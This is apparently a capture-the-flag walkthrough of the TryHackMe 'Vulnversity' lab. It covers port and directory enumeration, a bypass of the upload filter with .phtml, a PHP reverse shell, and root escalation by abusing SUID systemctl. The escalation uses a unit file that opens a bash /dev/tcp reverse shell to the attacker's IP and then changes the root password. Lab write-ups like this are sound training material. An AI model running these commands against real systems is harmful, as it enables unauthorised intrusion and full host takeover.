# Vulnversity

```bash
export IP=10.10.53.246
```

## NMAP

```bash
nmap -p- -T5 $IP
```

```
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3128/tcp open  squid-http
3333/tcp open  dec-notes
```

```bash
nmap -p 21,22,139,445,3128,3333 -A -T5 $IP
```

```
PORT     STATE SERVICE     VERSION

21/tcp   open  ftp         vsftpd 3.0.3

22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)

139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved

3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University

Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-03-27T23:54:40
|_  start_date: N/A
```

### Service: ftp 21

### Service: ssh 22

### Service: netbios-ssn 139

### Service: microsoft-ds 445

### Service: Squid proxy 3128

Testing connectivity with curl: 

```bash
curl --proxy $IP:3128 google.com
```

Success

### Service: dec-notes 3333

Web server: Apache/2.4.18

Saved index.html with:

```bash
wget $IP:3333
```

#### Enumeration with gobuster

```bash
gobuster -w ~/wordlists/dirbuster/directory-list-1.0.txt -u http://$IP:3333/
```

```
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.53.246:3333/
[+] Threads      : 10
[+] Wordlist     : ~/wordlists/dirbuster/directory-list-1.0.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2023/03/28 01:14:50 Starting gobuster
=====================================================
/images (Status: 301)
/css (Status: 301)
/js (Status: 301)
/internal (Status: 301)
...
```

Found: http://10.10.53.246:3333/internal/ (a upload page)

#### Reverse shell

```bash
nc -lvnp 4444
```

Upload the malicious php (reverse-shell.php)

Failed extension not allowed

Used burpsuit Intruder with a file like this:

```
.phtml
.php
.php3
.php4
.php5
.inc
.pHtml
.pHp
```

Found that .phtml is a valid extension

Download the following reverse PHP shell [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).

To gain remote access to this machine, follow these steps:

1. Edit the php-reverse-shell.php file and edit the ip to be your tun0 ip (you can get this by going to http://10.10.10.10 in the browser of your TryHackMe connected device).

2. Rename this file to php-reverse-shell.phtml

3. We're now going to listen to incoming connections using netcat. Run the following command: nc -lvnp 4444

4. Upload your shell and navigate to http://<ip>:3333/internal/uploads/php-reverse-shell.phtml - This will execute your payload

5. You should see a connection on your netcat session

Success reversed shell ✅

```
Listening on 0.0.0.0 4444
Connection received on 10.10.102.37 44138
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 21:02:40 up 19 min,  0 users,  load average: 0.00, 0.04, 0.15
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

Fix shell:

```
$ /usr/bin/script -qc /bin/bash /dev/null
www-data@vulnuniversity:/$
```

```
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:111:119:ftp daemon,,,:/srv/ftp:/bin/false
bill:x:1000:1000:,,,:/home/bill:/bin/bash
```

##### User flag:

```bash
$ cd /home/bill	
$ ls -la
total 24
drwxr-xr-x 2 bill bill 4096 Jul 31  2019 .
drwxr-xr-x 3 root root 4096 Jul 31  2019 ..
-rw-r--r-- 1 bill bill  220 Jul 31  2019 .bash_logout
-rw-r--r-- 1 bill bill 3771 Jul 31  2019 .bashrc
-rw-r--r-- 1 bill bill  655 Jul 31  2019 .profile
-rw-r--r-- 1 bill bill   33 Jul 31  2019 user.txt
$ cat user.txt
8bd7992fbe8a6ad22a63361004cfcedb
```

```bash
find / -type f -perm -4000
```

```
/bin/passwd
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/ping6
/bin/umount
/bin/systemctl
/bin/ping
/bin/fusermount
...
```

##### Root flag:

```bash
www-data@vulnuniversity:/$ cat /root/root.txt
cat: /root/root.txt: Permission denied
```

Using systemctl to create a service to run as root:

```bash
cd /tmp
touch getrootflag.sh
chmod u+x getrootflag.sh
echo "cat /root/root.txt > /tmp/key.txt" >> /tmp/getrootflag.sh
```

Systemctl service:

```
echo "[Unit]
Description=Example systemd service.

[Service]
Type=simple
ExecStart=/bin/bash /tmp/getrootflag.sh

[Install]
WantedBy=multi-user.target" > /tmp/getrootflag.service
```

```bash
systemctl enable /tmp/getrootflag.service
systemctl start getrootflag
```

```bash
www-data@vulnuniversity:/tmp$ cat key.txt
cat key.txt
a58ff8579f0a9270368d33a9966c7fd5
```

---

##### root reverse shell

```bash
nc -lvnp 7777
```

Host THM IP: 10.18.10.39

[Bash TCP reverse shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp)

Using systemctl to create a getroot.service to run as root:

```
echo "[Unit]
Description=Get root reverse shell.

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.18.10.39/7777 0>&1'

[Install]
WantedBy=multi-user.target" > /tmp/getroot.service
```

```bash
systemctl enable /tmp/getroot.service
systemctl start getroot
```

```
Listening on 0.0.0.0 7777
Connection received on 10.10.53.246 44768
```

```bash
root@vulnuniversity:/# whoami
root
root@vulnuniversity:/# passwd
Enter new UNIX password: newpasswd
Retype new UNIX password: newpasswd
passwd: password updated successfully
```

```bash
ssh root@$IP
```

PWNED ✅
